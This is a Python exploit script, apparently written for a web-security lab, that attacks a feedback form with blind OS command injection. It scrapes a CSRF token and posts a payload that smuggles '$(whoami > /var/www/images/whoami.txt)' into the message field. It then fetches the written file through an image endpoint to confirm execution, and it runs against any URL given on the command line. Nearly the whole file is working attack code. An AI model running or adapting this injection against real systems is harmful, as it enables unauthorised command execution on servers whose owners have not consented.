import urllib3
import bs4
import sys
import requests

# to disable unwanted warnings about certificates, .. etc.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# configure the proxy settings.
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

# Creating the OS Command injection function.
def run(url):
    # Creating a session for the CSRF token
    session = requests.session()
    csrf = get_csrf(url, session)
    path = '/feedback/submit'

    # Creating a temp file that stores the output of our injected command.
    tempFile = "whoami.txt"

    payload = '" $(whoami > /var/www/images/' + tempFile + ') #' # The "#" symbol in the payload is used for commenting the rest of the pre-typed command.
    data = { "csrf":csrf, 'name':'A', 'email':'AAA@gmail.com', 'subject':'A', 'message':"A" + payload}
    session.post(url + path, data=data, verify=False, proxies=proxies)
    
    # Checks if the file created successfully.
    check_file(url, tempFile, session)

# Create a function that pull out the CSRF token:
def get_csrf(url, session):
    path = "/feedback"
    respond = session.get(url + path, verify=False, proxies=proxies)

    # We use BeautifulSoup to parse the HTML page.
    soup = bs4.BeautifulSoup(respond.text, "html.parser")
    csrf = soup.find("input")["value"]

    return csrf

# Create a function that checks the existence of the file
# that contains the output of our injected command.
def check_file(url ,file, session:requests):
    path = '/image'
    params = {"filename": file}
    respond = session.get(url + path, params=params, verify=False)

    # Checks if the file exists
    if respond.text != '"Not Found"':
        print("(+) The Feedback submission is vulnerable to OS command injection.")
        print("(+) The contents of the " + file + ":")
        print(respond.text)
    else:
        print("(-) The Feedback submission is NOT vulnerable to OS command injection.")

# Defining the main function
def main():

    # Checks if the script run on the command-line correctly.
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    # if the input is valid:
    url = sys.argv[1]
    print("(+) Checking if the Feedback submission is vulnerable... ")
    run(url)

if __name__ == "__main__":
    main()
